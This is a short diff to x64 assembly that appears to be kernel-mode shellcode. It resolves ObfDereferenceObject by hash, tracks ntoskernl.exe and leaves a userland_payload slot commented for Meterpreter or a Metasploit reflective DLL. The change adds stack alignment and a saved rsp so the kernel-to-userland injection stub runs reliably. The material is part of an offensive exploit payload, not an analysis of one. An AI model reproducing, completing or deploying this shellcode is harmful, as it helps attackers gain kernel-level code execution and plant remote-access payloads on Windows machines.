@@ -23,6 +23,8 @@ OBFDEREFERENCEOBJECT_HASH             equ      0x32c5ddf6   ; hash("ObfDereferen
 
   ; cld
 
+  push rsp
+  and sp, 0xFFF0                                    ; align stack
   push rsi                                          ; save clobbered registers
   push r14                                          ; r14 will store ntoskernl.exe
 
@@ -49,6 +51,7 @@ inject_end:
 
   pop r14
   pop rsi                                           ; restore clobbered registers and return
+  pop rsp
   ret
 
 userland_start:
@@ -59,4 +62,3 @@ userland_payload:
   ; insert user land payload here
   ; such as meterpreter
   ; or reflective dll with the metasploit MZ pre-stub
-
